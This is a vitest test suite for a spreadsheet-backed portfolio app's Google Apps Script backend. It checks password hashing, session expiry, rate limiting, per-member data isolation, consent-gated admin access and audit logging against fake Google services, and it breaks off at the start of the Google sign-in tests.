import { createHash, createHmac, pbkdf2Sync, randomUUID } from 'node:crypto';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { beforeEach, describe, expect, it } from 'vitest';
import { TABLE_NAMES } from '@core/index';

// Runs gas/Code.gs against in-memory stand-ins for the Apps Script
// services. It checks the script's own logic; it cannot prove behaviour of
// the real Google services. Hashes are real (Node crypto); time is a fake
// clock the tests can advance; every fake spreadsheet is a distinct object.

const CLIENT_ID = 'fictional-client-id.apps.example';
const DAY = 86_400_000;

class FakeRange {
  constructor(
    private sheet: FakeSheet,
    private row: number,
    private col: number,
    private rows: number,
    private cols: number,
  ) {}
  getValues() {
    return Array.from({ length: this.rows }, (_, r) =>
      Array.from(
        { length: this.cols },
        (_, c) => this.sheet.cells[this.row - 1 + r]?.[this.col - 1 + c] ?? '',
      ),
    );
  }
  getValue() {
    return this.getValues()[0][0];
  }
  setValues(values: unknown[][]) {
    this.sheet.guard();
    values.forEach((line, r) => {
      const target = (this.sheet.cells[this.row - 1 + r] ??= []);
      line.forEach((v, c) => (target[this.col - 1 + c] = v));
    });
    return this;
  }
  setNumberFormat() {
    return this;
  }
}

class FakeSheet {
  cells: unknown[][] = [];
  constructor(
    public name: string,
    public guard: () => void,
  ) {}
  getLastRow() {
    return this.cells.length;
  }
  getLastColumn() {
    return Math.max(0, ...this.cells.map((r) => r.length));
  }
  getRange(row: number, col: number, rows = 1, cols = 1) {
    return new FakeRange(this, row, col, rows, cols);
  }
  clearContents() {
    this.guard();
    this.cells = [];
  }
  setFrozenRows() {}
}

class FakeSpreadsheet {
  sheets = new Map<string, FakeSheet>();
  constructor(
    public id: string,
    public guard: () => void,
    defaultSheet: boolean,
  ) {
    if (defaultSheet) this.sheets.set('Sheet1', new FakeSheet('Sheet1', guard));
  }
  getId() {
    return this.id;
  }
  getSheetByName(n: string) {
    return this.sheets.get(n) ?? null;
  }
  insertSheet(n: string) {
    this.guard();
    const s = new FakeSheet(n, this.guard);
    this.sheets.set(n, s);
    return s;
  }
  getSheets() {
    return [...this.sheets.values()];
  }
  deleteSheet(s: FakeSheet) {
    this.guard();
    this.sheets.delete(s.name);
  }
}

type FetchReply = { code: number; text: string };
type Bytes = number[];

const toBuffer = (v: string | Bytes) =>
  typeof v === 'string' ? Buffer.from(v, 'utf8') : Buffer.from(v.map((b) => b & 0xff));
const signed = (buf: Buffer): Bytes => Array.from(buf, (b) => (b > 127 ? b - 256 : b));

function makeRuntime(fetchAll: (reqs: Array<{ url: string }>) => FetchReply[] = () => []) {
  // Most suites exercise password accounts; the Google-only default has its own.
  const props = new Map<string, string>([['PASSWORD_LOGIN', 'on']]);
  const cacheStore = new Map<string, { value: string; expires: number }>();
  const clock = { now: Date.UTC(2026, 9, 1, 12, 0, 0) };
  const state = { locked: false, lockCalls: 0, hmacCalls: 0 };
  const guard = () => {
    // Every write to any sheet must happen while the script lock is held.
    if (!state.locked) throw new Error('sheet write outside LockService lock');
  };

  const spreadsheets = new Map<string, FakeSpreadsheet>();
  const control = new FakeSpreadsheet('control', guard, false);
  spreadsheets.set('control', control);
  const trashed: string[] = [];
  const googleTokens = new Map<string, Record<string, unknown>>();
  const tokeninfoCalls: string[] = [];

  /** Register a fake Google ID token and return the string a client would send. */
  const idToken = (sub: string, email: string, overrides: Record<string, unknown> = {}) => {
    const token = `tok_${sub}_${googleTokens.size}`;
    googleTokens.set(token, {
      aud: CLIENT_ID,
      iss: 'https://accounts.google.com',
      exp: String(Math.floor(clock.now / 1000) + 3600),
      email_verified: 'true',
      sub,
      email,
      name: `G ${sub}`,
      ...overrides,
    });
    return token;
  };

  class FakeDate extends Date {
    constructor(...args: unknown[]) {
      if (args.length === 0) super(clock.now);
      else super(...(args as [number]));
    }
    static now() {
      return clock.now;
    }
  }

  const reply = (r: FetchReply) => ({
    getResponseCode: () => r.code,
    getContentText: () => r.text,
  });
  const context = vm.createContext({
    Date: FakeDate,
    SpreadsheetApp: {
      getActiveSpreadsheet: () => control,
      openById: (id: string) => {
        const ss = spreadsheets.get(id);
        if (!ss) throw new Error(`No spreadsheet ${id}`);
        return ss;
      },
      create: () => {
        guard();
        const ss = new FakeSpreadsheet(`ss_${spreadsheets.size}`, guard, true);
        spreadsheets.set(ss.id, ss);
        return ss;
      },
    },
    DriveApp: {
      getFileById: (id: string) => {
        if (!spreadsheets.has(id) || id === 'control') throw new Error(`No file ${id}`);
        return { setTrashed: (flag: boolean) => flag && trashed.push(id) };
      },
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k: string) => props.get(k) ?? null,
        setProperty: (k: string, v: string) => props.set(k, v),
      }),
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k: string) => {
          const hit = cacheStore.get(k);
          if (hit && hit.expires <= clock.now) cacheStore.delete(k);
          return cacheStore.get(k)?.value ?? null;
        },
        put: (k: string, v: string, seconds = 600) =>
          cacheStore.set(k, { value: v, expires: clock.now + seconds * 1000 }),
        remove: (k: string) => cacheStore.delete(k),
      }),
    },
    LockService: {
      getScriptLock: () => ({
        waitLock() {
          if (state.locked) throw new Error('lock already held: code must not rely on re-entrancy');
          state.locked = true;
          state.lockCalls++;
        },
        releaseLock() {
          state.locked = false;
        },
      }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text: string) => ({
        text,
        setMimeType() {
          return this;
        },
      }),
    },
    UrlFetchApp: {
      fetchAll: (reqs: Array<{ url: string }>) => fetchAll(reqs).map(reply),
      fetch: (url: string) => {
        if (url.startsWith('https://oauth2.googleapis.com/tokeninfo?id_token=')) {
          const token = decodeURIComponent(url.split('id_token=')[1]);
          tokeninfoCalls.push(token);
          const info = googleTokens.get(token);
          return reply(
            info
              ? { code: 200, text: JSON.stringify(info) }
              : { code: 400, text: '{"error":"invalid_token"}' },
          );
        }
        return reply(fetchAll([{ url }])[0]);
      },
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'SHA_256' },
      Charset: { UTF_8: 'UTF_8' },
      getUuid: () => randomUUID(),
      computeDigest: (algo: string, value: string | Bytes) => {
        if (algo !== 'SHA_256') throw new Error('unexpected digest');
        return signed(createHash('sha256').update(toBuffer(value)).digest());
      },
      computeHmacSha256Signature: (value: string | Bytes, key: string | Bytes) => {
        state.hmacCalls++;
        return signed(createHmac('sha256', toBuffer(key)).update(toBuffer(value)).digest());
      },
      base64Encode: (value: string | Bytes) => toBuffer(value).toString('base64'),
    },
    Logger: { log() {} },
  });
  vm.runInContext(readFileSync('gas/Code.gs', 'utf8'), context);
  const post = (body: object) =>
    JSON.parse((context as any).doPost({ postData: { contents: JSON.stringify(body) } }).text);

  /** Every cell of every fake spreadsheet, as text, for secret scans. */
  const everyCell = () =>
    [...spreadsheets.values()].flatMap((ss) =>
      [...ss.sheets.values()].flatMap((s) => s.cells.flat().map(String)),
    );
  const withLock = <T>(fn: () => T): T => {
    state.locked = true;
    try {
      return fn();
    } finally {
      state.locked = false;
    }
  };
  return {
    post,
    props,
    clock,
    state,
    control,
    spreadsheets,
    trashed,
    idToken,
    tokeninfoCalls,
    everyCell,
    withLock,
    sheets: control.sheets,
    call: (name: string, ...args: unknown[]) => (context as any)[name](...args),
    advance: (ms: number) => (clock.now += ms),
  };
}

type Runtime = ReturnType<typeof makeRuntime>;
type Res = Record<string, any>;

const key = (n: number) => n.toString(16).padStart(64, '0');

describe('GAS source', () => {
  it('lists the same tables as the core data model', () => {
    const source = readFileSync('gas/Code.gs', 'utf8');
    const listed = /var TABLES = \[([\s\S]*?)\]/
      .exec(source)![1]
      .match(/'(\w+)'/g)!
      .map((s) => s.slice(1, -1));
    expect(listed).toEqual(TABLE_NAMES);
  });

  it('no longer has the shared token gate and holds no secrets', () => {
    const source = readFileSync('gas/Code.gs', 'utf8');
    expect(source).not.toMatch(/EXFOLIO_TOKEN|setupToken/);
    expect(source).not.toMatch(/https:\/\/script\.google\.com|docs\.google\.com\/spreadsheets/);
  });

  it('requests the Drive scope only for trashing member spreadsheets', () => {
    const manifest = JSON.parse(readFileSync('gas/appsscript.json', 'utf8'));
    expect(manifest.oauthScopes).toEqual([
      'https://www.googleapis.com/auth/spreadsheets',
      'https://www.googleapis.com/auth/drive',
      'https://www.googleapis.com/auth/script.external_request',
    ]);
  });
});

describe('GAS backend', () => {
  let rt: Runtime;
  const ok = (body: object): Res => {
    const res = rt.post(body);
    if (!res.ok) throw new Error(`expected ok, got ${res.error}`);
    return res;
  };
  const fail = (body: object): string => {
    const res = rt.post(body);
    if (res.ok) throw new Error('expected an error');
    return res.error;
  };
  const isErr = (body: object) => rt.post(body).ok === false;

  beforeEach(() => {
    rt = makeRuntime();
  });

  /** First account (admin) plus one approved member. */
  function twoMembers() {
    const admin = ok({ action: 'register', username: 'Admin', passwordKey: key(1) });
    ok({ action: 'register', username: 'amy', passwordKey: key(2) });
    const users = ok({ action: 'adminUsers', session: admin.session }).users as Res[];
    const amy = users.find((u) => u.username === 'amy')!;
    ok({ action: 'adminUpdateUser', session: admin.session, userId: amy.id, status: 'active' });
    const login = ok({ action: 'login', username: 'amy', passwordKey: key(2) });
    return {
      admin: admin.session as string,
      adminId: admin.user.id as string,
      amy: login.session as string,
      amyId: amy.id as string,
    };
  }

  describe('registration and login', () => {
    it('makes the first account an active admin and later ones pending', () => {
      expect(ok({ action: 'config' }).config).toMatchObject({
        authRequired: true,
        hasUsers: false,
        registration: 'approval',
      });
      const first = ok({ action: 'register', username: 'Admin', passwordKey: key(1) });
      expect(first.user).toMatchObject({
        username: 'admin',
        role: 'admin',
        status: 'active',
        allowAdminView: true,
      });
      expect(first.session).toBeTruthy();
      const second = ok({ action: 'register', username: 'amy', passwordKey: key(2) });
      expect(second.user).toMatchObject({ role: 'member', status: 'pending' });
      expect(second.session).toBeUndefined();
      expect(fail({ action: 'login', username: 'amy', passwordKey: key(2) })).toBe('pending');
    });

    it('activates new accounts at once when registration is open', () => {
      const admin = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      ok({ action: 'adminSetConfig', session: admin.session, registration: 'open' });
      const amy = ok({ action: 'register', username: 'amy', passwordKey: key(2) });
      expect(amy.user.status).toBe('active');
      expect(amy.session).toBeTruthy();
    });

    it('rejects duplicate names, bad names and malformed keys', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(fail({ action: 'register', username: 'ADMIN', passwordKey: key(2) })).toBe(
        'username_taken',
      );
      expect(isErr({ action: 'register', username: 'a b', passwordKey: key(2) })).toBe(true);
      expect(isErr({ action: 'register', username: 'carol', passwordKey: 'plaintext' })).toBe(true);
    });

    it('gives the same answer for a wrong password and an unknown account', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(fail({ action: 'login', username: 'admin', passwordKey: key(9) })).toBe(
        'invalid_credentials',
      );
      expect(fail({ action: 'login', username: 'nobody', passwordKey: key(9) })).toBe(
        'invalid_credentials',
      );
    });

    it('does the same hashing work for an unknown account as for a known one', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      let before = rt.state.hmacCalls;
      fail({ action: 'login', username: 'admin', passwordKey: key(9) });
      const known = rt.state.hmacCalls - before;
      before = rt.state.hmacCalls;
      fail({ action: 'login', username: 'nobody', passwordKey: key(9) });
      expect(rt.state.hmacCalls - before).toBe(known);
      expect(known).toBeGreaterThanOrEqual(1000);
    });

    it('locks an account name after repeated failures, then releases it after the window', () => {
      ok({ action: 'register', username: 'locked', passwordKey: key(1) });
      for (let i = 0; i < 8; i++)
        fail({ action: 'login', username: 'locked', passwordKey: key(9) });
      expect(fail({ action: 'login', username: 'locked', passwordKey: key(1) })).toBe(
        'rate_limited',
      );
      rt.advance(14 * 60_000);
      expect(fail({ action: 'login', username: 'locked', passwordKey: key(1) })).toBe(
        'rate_limited',
      );
      rt.advance(2 * 60_000);
      ok({ action: 'login', username: 'locked', passwordKey: key(1) });
    });

    it('does not count a locked-out name against other accounts', () => {
      ok({ action: 'register', username: 'locked', passwordKey: key(1) });
      for (let i = 0; i < 8; i++)
        fail({ action: 'login', username: 'locked', passwordKey: key(9) });
      expect(fail({ action: 'login', username: 'someone', passwordKey: key(9) })).toBe(
        'invalid_credentials',
      );
    });

    it('stores neither the password key nor the session token', () => {
      const res = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      const login = ok({ action: 'login', username: 'admin', passwordKey: key(1) });
      const cells = rt.everyCell().join('\n');
      expect(cells).not.toContain(key(1));
      expect(cells).not.toContain(res.session);
      expect(cells).not.toContain(login.session);
    });

    it('keeps password hashes, salts, session hashes and Google ids out of readable columns', () => {
      const admin = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      ok({ action: 'adminSetConfig', session: admin.session, googleClientId: CLIENT_ID });
      ok({
        action: 'linkGoogle',
        session: admin.session,
        idToken: rt.idToken('g-secret-sub', 'admin@example.com'),
      });
      for (const name of ['_users', '_sessions']) {
        const rows = rt.sheets.get(name)!.cells;
        const header = rows[0] as string[];
        const jsonAt = header.indexOf('_json');
        expect(jsonAt).toBeGreaterThan(0);
        for (const hidden of [
          'passwordSalt',
          'passwordHash',
          'passwordRounds',
          'googleSub',
          'tokenHash',
        ]) {
          expect(header).not.toContain(hidden);
        }
        const mirror = rows
          .slice(1)
          .flatMap((r) => r.filter((_, i) => i !== jsonAt))
          .join('\n');
        const record = JSON.parse(String(rows[1][jsonAt]));
        for (const field of ['passwordSalt', 'passwordHash', 'tokenHash', 'googleSub']) {
          if (record[field]) expect(mirror).not.toContain(record[field]);
        }
      }
      // They are in the JSON cell: the README says anyone with the sheet can read them.
      const user = JSON.parse(String(rt.sheets.get('_users')!.cells[1].at(-1)));
      expect(user.passwordHash).toMatch(/^[0-9a-f]{64}$/);
    });

    it('hashes with a standard PBKDF2 and a per-member salt', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      ok({ action: 'register', username: 'amy', passwordKey: key(1) });
      const [a, b] = rt.sheets
        .get('_users')!
        .cells.slice(1)
        .map((r) => JSON.parse(String(r.at(-1))));
      expect(a.passwordSalt).not.toBe(b.passwordSalt);
      expect(a.passwordHash).not.toBe(b.passwordHash);
      expect(a.passwordHash).toBe(
        pbkdf2Sync(
          Buffer.from(key(1), 'hex'),
          Buffer.from(a.passwordSalt, 'hex'),
          a.passwordRounds,
          32,
          'sha256',
        ).toString('hex'),
      );
      expect(a.passwordRounds).toBeGreaterThanOrEqual(1000);
    });

    it('ends a session on logout', () => {
      const res = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      ok({ action: 'logout', session: res.session });
      expect(fail({ action: 'me', session: res.session })).toBe('unauthenticated');
    });

    it('issues distinct random 256-bit tokens and expires them after 30 days', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      const a = ok({ action: 'login', username: 'admin', passwordKey: key(1) }).session as string;
      const b = ok({ action: 'login', username: 'admin', passwordKey: key(1) }).session as string;
      expect(a).toMatch(/^[0-9a-f]{64}$/);
      expect(a).not.toBe(b);
      rt.advance(29 * DAY);
      ok({ action: 'me', session: a });
      rt.advance(2 * DAY);
      expect(fail({ action: 'me', session: a })).toBe('unauthenticated');
    });

    it('prunes expired sessions the next time anything is written', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      ok({ action: 'login', username: 'admin', passwordKey: key(1) });
      expect(rt.sheets.get('_sessions')!.cells.length).toBe(3); // header + 2
      rt.advance(31 * DAY);
      ok({ action: 'login', username: 'admin', passwordKey: key(1) });
      expect(rt.sheets.get('_sessions')!.cells.length).toBe(2);
    });
  });

  describe('routing and fail-closed behaviour', () => {
    it('keeps ping and config open and answers unknown actions only to members', () => {
      expect(ok({ action: 'ping' })).toEqual({ ok: true, backend: 'gas' });
      expect(fail({ action: 'whatever' })).toBe('unauthenticated');
      const admin = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(fail({ action: 'whatever', session: admin.session })).toMatch(/Unknown action/);
      expect(fail({})).toBe('unauthenticated');
    });

    it('refuses every protected action without a session', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      const protectedActions: object[] = [
        { action: 'me' },
        { action: 'updateProfile', displayName: 'x' },
        { action: 'changePassword', newPasswordKey: key(3) },
        { action: 'linkGoogle', idToken: 'x' },
        { action: 'adminUsers' },
        { action: 'adminUpdateUser', userId: 'u', role: 'admin' },
        { action: 'adminDeleteUser', userId: 'u' },
        { action: 'adminSetConfig', registration: 'open' },
        { action: 'adminAudit' },
        { action: 'load' },
        { action: 'save', tables: {} },
        { action: 'quotes', items: [] },
        { action: 'history', items: [], from: '2026-01-01' },
      ];
      for (const request of protectedActions) {
        expect(fail(request)).toBe('unauthenticated');
        expect(fail({ ...request, session: 'made-up' })).toBe('unauthenticated');
      }
    });

    it('refuses garbage request bodies without throwing', () => {
      expect((rt.call('doPost', { postData: { contents: 'null' } }) as any).text).toContain(
        'unauthenticated',
      );
      expect(
        JSON.parse((rt.call('doPost', { postData: { contents: '{not json' } }) as any).text).ok,
      ).toBe(false);
      expect(JSON.parse((rt.call('doGet') as any).text).ok).toBe(false);
    });

    it('does not fetch quotes for anyone without a session', () => {
      let calls = 0;
      rt = makeRuntime((reqs) => {
        calls += reqs.length;
        return reqs.map(() => ({ code: 200, text: '{}' }));
      });
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(fail({ action: 'quotes', items: [{ source: 'yahoo', symbol: 'X' }] })).toBe(
        'unauthenticated',
      );
      expect(
        fail({ action: 'history', items: [{ source: 'yahoo', symbol: 'X' }], from: '2026-01-01' }),
      ).toBe('unauthenticated');
      expect(calls).toBe(0);
    });

    it('holds the script lock for every write', () => {
      // The fake throws on any sheet write outside the lock; this runs the
      // whole lifecycle and checks the lock was used and released.
      const s = twoMembers();
      ok({ action: 'save', session: s.amy, tables: { brokers: [{ id: 'b' }] } });
      ok({ action: 'updateProfile', session: s.amy, allowAdminView: false });
      ok({ action: 'adminDeleteUser', session: s.admin, userId: s.amyId });
      expect(rt.state.lockCalls).toBeGreaterThan(5);
      expect(rt.state.locked).toBe(false);
    });

    it('releases the lock when an action fails', () => {
      const s = twoMembers();
      fail({ action: 'adminUpdateUser', session: s.admin, userId: s.adminId, role: 'member' });
      expect(rt.state.locked).toBe(false);
    });
  });

  describe('data isolation', () => {
    it('requires a session for data and quotes', () => {
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(fail({ action: 'load' })).toBe('unauthenticated');
      expect(fail({ action: 'save', tables: {} })).toBe('unauthenticated');
      expect(fail({ action: 'quotes', items: [] })).toBe('unauthenticated');
      expect(fail({ action: 'load', session: 'made-up' })).toBe('unauthenticated');
    });

    it('keeps each member in their own spreadsheet', () => {
      const s = twoMembers();
      ok({
        action: 'save',
        session: s.admin,
        tables: { brokers: [{ id: 'a', name: '示範券商甲' }] },
      });
      ok({
        action: 'save',
        session: s.amy,
        tables: { brokers: [{ id: 'b', name: '示範券商乙' }] },
      });
      expect(ok({ action: 'load', session: s.admin }).tables.brokers).toEqual([
        { id: 'a', name: '示範券商甲' },
      ]);
      expect(ok({ action: 'load', session: s.amy }).tables.brokers).toEqual([
        { id: 'b', name: '示範券商乙' },
      ]);

      const users = rt.sheets
        .get('_users')!
        .cells.slice(1)
        .map((r) => JSON.parse(String(r.at(-1))));
      const ids = users.map((u) => u.dataSheetId);
      expect(new Set(ids).size).toBe(2);
      const [adminSs, amySs] = ids.map((id) => rt.spreadsheets.get(id)!);
      expect(adminSs).not.toBe(amySs);
      expect(adminSs.sheets.has('brokers')).toBe(true);
      expect(adminSs.sheets.has('_meta')).toBe(true);
      expect(adminSs.sheets.has('Sheet1')).toBe(false);
      const text = (ss: FakeSpreadsheet) =>
        [...ss.sheets.values()].flatMap((sh) => sh.cells.flat().map(String)).join('\n');
      expect(text(adminSs)).toContain('示範券商甲');
      expect(text(adminSs)).not.toContain('示範券商乙');
      expect(text(amySs)).not.toContain('示範券商甲');
      // The control spreadsheet holds ids, not portfolio data.
      expect(rt.sheets.has('brokers')).toBe(false);
      expect(rt.everyCell().length).toBeGreaterThan(0);
      expect(text(rt.control)).not.toContain('示範券商');
    });

    it('creates a member spreadsheet only on first save, not on load', () => {
      const s = twoMembers();
      const before = rt.spreadsheets.size;
      const loaded = ok({ action: 'load', session: s.amy });
      expect(loaded.revision).toBe(0);
      expect(loaded.tables.transactions).toEqual([]);
      expect(rt.spreadsheets.size).toBe(before);
      ok({ action: 'save', session: s.amy, tables: { brokers: [{ id: 'b' }] }, baseRevision: 0 });
      expect(rt.spreadsheets.size).toBe(before + 1);
      ok({ action: 'save', session: s.amy, tables: { brokers: [{ id: 'b' }] } });
      expect(rt.spreadsheets.size).toBe(before + 1);
    });

    it('lets a member not read another member, whatever they ask for', () => {
      const s = twoMembers();
      expect(fail({ action: 'load', session: s.amy, asUser: s.adminId })).toBe('forbidden');
      expect(fail({ action: 'adminUsers', session: s.amy })).toBe('forbidden');
      expect(fail({ action: 'adminAudit', session: s.amy })).toBe('forbidden');
      expect(
        fail({ action: 'adminUpdateUser', session: s.amy, userId: s.amyId, role: 'admin' }),
      ).toBe('forbidden');
      expect(fail({ action: 'adminDeleteUser', session: s.amy, userId: s.adminId })).toBe(
        'forbidden',
      );
      expect(fail({ action: 'adminSetConfig', session: s.amy, registration: 'open' })).toBe(
        'forbidden',
      );
    });

    it('lets an admin read a consenting member read-only, and logs it', () => {
      const s = twoMembers();
      ok({
        action: 'save',
        session: s.amy,
        tables: { brokers: [{ id: 'b', name: '示範券商乙' }] },
      });
      const view = ok({ action: 'load', session: s.admin, asUser: s.amyId });
      expect(view.tables.brokers).toHaveLength(1);
      const audit = ok({ action: 'adminAudit', session: s.admin }).audit as Res[];
      expect(audit[0]).toMatchObject({
        action: 'view-data',
        targetId: s.amyId,
        actorId: s.adminId,
      });
      // A save always goes to the caller's own data: there is no way to name another.
      ok({ action: 'save', session: s.admin, tables: { brokers: [] }, asUser: s.amyId });
      expect(ok({ action: 'load', session: s.amy }).tables.brokers).toHaveLength(1);
    });

    it('does not create a spreadsheet when an admin views a member who never saved', () => {
      const s = twoMembers();
      const before = rt.spreadsheets.size;
      expect(ok({ action: 'load', session: s.admin, asUser: s.amyId }).tables.brokers).toEqual([]);
      expect(rt.spreadsheets.size).toBe(before);
    });

    it('stops admin viewing once the member withdraws consent', () => {
      const s = twoMembers();
      ok({ action: 'updateProfile', session: s.amy, allowAdminView: false });
      expect(fail({ action: 'load', session: s.admin, asUser: s.amyId })).toBe('forbidden');
      const audit = ok({ action: 'adminAudit', session: s.admin }).audit as Res[];
      expect(audit[0]).toMatchObject({ action: 'set-admin-view', detail: 'refused' });
    });

    it('hands pre-accounts data in the control spreadsheet to the first member only', () => {
      rt.withLock(() => {
        rt.call('writeTable_', rt.control, 'brokers', [{ id: 'old', name: '舊資料' }], []);
        rt.call('setRevision_', rt.control, 3);
      });
      const s = twoMembers();
      const mine = ok({ action: 'load', session: s.admin });
      expect(mine.tables.brokers).toEqual([{ id: 'old', name: '舊資料' }]);
      expect(mine.revision).toBe(3);
      const amy = ok({ action: 'load', session: s.amy });
      expect(amy.tables.brokers).toEqual([]);
      expect(amy.revision).toBe(0);
      // A save on the handed-over data continues the revision count.
      expect(ok({ action: 'save', session: s.admin, tables: {}, baseRevision: 3 }).revision).toBe(
        4,
      );
      // The hand-over happened once: a later admin changing nothing does not repeat it.
      const config = JSON.parse(String(rt.sheets.get('_config')!.cells[1].at(-1)));
      expect(config.legacyHandedOver).toBeTruthy();
    });

    it('registers normally when the control spreadsheet holds no old data', () => {
      const admin = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(rt.spreadsheets.size).toBe(1);
      expect(ok({ action: 'load', session: admin.session }).tables.brokers).toEqual([]);
    });
  });

  describe('account management', () => {
    it('changes a password only with the old one, and signs out other sessions', () => {
      const s = twoMembers();
      const other = ok({ action: 'login', username: 'amy', passwordKey: key(2) }).session;
      expect(
        fail({
          action: 'changePassword',
          session: s.amy,
          oldPasswordKey: key(9),
          newPasswordKey: key(3),
        }),
      ).toBe('invalid_credentials');
      ok({
        action: 'changePassword',
        session: s.amy,
        oldPasswordKey: key(2),
        newPasswordKey: key(3),
      });
      ok({ action: 'me', session: s.amy });
      expect(fail({ action: 'me', session: other })).toBe('unauthenticated');
      expect(fail({ action: 'login', username: 'amy', passwordKey: key(2) })).toBe(
        'invalid_credentials',
      );
      ok({ action: 'login', username: 'amy', passwordKey: key(3) });
    });

    it('disabling a member ends their sessions at once', () => {
      const s = twoMembers();
      ok({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, status: 'disabled' });
      expect(fail({ action: 'load', session: s.amy })).toBe('unauthenticated');
      expect(fail({ action: 'login', username: 'amy', passwordKey: key(2) })).toBe('disabled');
    });

    it('lets an admin reset a password', () => {
      const s = twoMembers();
      ok({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, newPasswordKey: key(7) });
      expect(fail({ action: 'me', session: s.amy })).toBe('unauthenticated');
      ok({ action: 'login', username: 'amy', passwordKey: key(7) });
    });

    it('never leaves the system without an active admin', () => {
      const s = twoMembers();
      expect(
        isErr({ action: 'adminUpdateUser', session: s.admin, userId: s.adminId, role: 'member' }),
      ).toBe(true);
      expect(
        isErr({
          action: 'adminUpdateUser',
          session: s.admin,
          userId: s.adminId,
          status: 'disabled',
        }),
      ).toBe(true);
      expect(isErr({ action: 'adminDeleteUser', session: s.admin, userId: s.adminId })).toBe(true);
      ok({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, role: 'admin' });
      ok({ action: 'adminUpdateUser', session: s.admin, userId: s.adminId, role: 'member' });
      // amy is now the only admin and cannot be removed or demoted by herself.
      expect(
        isErr({ action: 'adminUpdateUser', session: s.amy, userId: s.amyId, role: 'member' }),
      ).toBe(true);
    });

    it('deletes a member together with their data', () => {
      const s = twoMembers();
      ok({
        action: 'save',
        session: s.amy,
        tables: { brokers: [{ id: 'b', name: '示範券商乙' }] },
      });
      const users = ok({ action: 'adminUsers', session: s.admin }).users as Res[];
      expect(users).toHaveLength(2);
      const amyRow = rt.sheets
        .get('_users')!
        .cells.slice(1)
        .map((r) => JSON.parse(String(r.at(-1))))
        .find((u) => u.id === s.amyId);
      ok({ action: 'adminDeleteUser', session: s.admin, userId: s.amyId });
      expect(rt.trashed).toEqual([amyRow.dataSheetId]);
      expect(fail({ action: 'load', session: s.amy })).toBe('unauthenticated');
      expect(
        (ok({ action: 'adminUsers', session: s.admin }).users as Res[]).map((u) => u.id),
      ).toEqual([s.adminId]);
      const audit = ok({ action: 'adminAudit', session: s.admin }).audit as Res[];
      expect(audit[0]).toMatchObject({
        action: 'delete-user',
        targetId: s.amyId,
        detail: 'account and data removed',
      });
    });

    it('deletes a member who never saved without touching Drive', () => {
      const s = twoMembers();
      ok({ action: 'adminDeleteUser', session: s.admin, userId: s.amyId });
      expect(rt.trashed).toEqual([]);
    });

    it('still deletes the account if Drive cannot trash the file, and says so in the audit log', () => {
      const s = twoMembers();
      ok({ action: 'save', session: s.amy, tables: { brokers: [{ id: 'b' }] } });
      rt.spreadsheets.delete('ss_1'); // file already gone from Drive
      ok({ action: 'adminDeleteUser', session: s.admin, userId: s.amyId });
      const audit = ok({ action: 'adminAudit', session: s.admin }).audit as Res[];
      expect(audit[0].detail).toMatch(/could not be trashed/);
    });

    it('does not let an admin delete their own account', () => {
      const s = twoMembers();
      ok({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, role: 'admin' });
      expect(isErr({ action: 'adminDeleteUser', session: s.admin, userId: s.adminId })).toBe(true);
    });

    it('rejects bad status, role and registration values', () => {
      const s = twoMembers();
      expect(
        isErr({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, status: 'weird' }),
      ).toBe(true);
      expect(
        isErr({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, role: 'root' }),
      ).toBe(true);
      expect(
        isErr({ action: 'adminUpdateUser', session: s.admin, userId: 'nope', role: 'admin' }),
      ).toBe(true);
      expect(isErr({ action: 'adminSetConfig', session: s.admin, registration: 'wild' })).toBe(
        true,
      );
      expect(isErr({ action: 'adminSetConfig', session: s.admin, googleClientId: 'bad id!' })).toBe(
        true,
      );
    });

    it('writes every kind of audit entry and caps the log at 1000', () => {
      const s = twoMembers();
      ok({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, role: 'admin' });
      ok({ action: 'adminUpdateUser', session: s.admin, userId: s.amyId, status: 'disabled' });
      ok({
        action: 'adminUpdateUser',
        session: s.admin,
        userId: s.amyId,
        status: 'active',
        newPasswordKey: key(5),
      });
      ok({
        action: 'adminSetConfig',
        session: s.admin,
        registration: 'open',
        googleClientId: CLIENT_ID,
      });
      ok({
        action: 'linkGoogle',
        session: s.admin,
        idToken: rt.idToken('g1', 'admin@example.com'),
      });
      ok({
        action: 'changePassword',
        session: s.admin,
        oldPasswordKey: key(1),
        newPasswordKey: key(4),
      });
      const kinds = new Set(
        (ok({ action: 'adminAudit', session: s.admin }).audit as Res[]).map((e) => e.action),
      );
      for (const kind of [
        'register',
        'set-status',
        'set-role',
        'reset-password',
        'change-password',
        'set-registration',
        'set-google-client',
        'link-google',
      ]) {
        expect(kinds.has(kind)).toBe(true);
      }
      for (let i = 0; i < 1005; i++)
        ok({ action: 'updateProfile', session: s.admin, allowAdminView: i % 2 === 1 });
      const audit = ok({ action: 'adminAudit', session: s.admin }).audit as Res[];
      expect(audit).toHaveLength(1000);
      expect(audit[0].action).toBe('set-admin-view');
    });
  });

  describe('Google sign-in', () => {
    const setup = () => {
      const admin = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      ok({ action: 'adminSetConfig', session: admin.session, googleClientId: CLIENT_ID });
      return admin.session as string;
    };

    it('is refused until a client id is configured, and for bad tokens', () => {
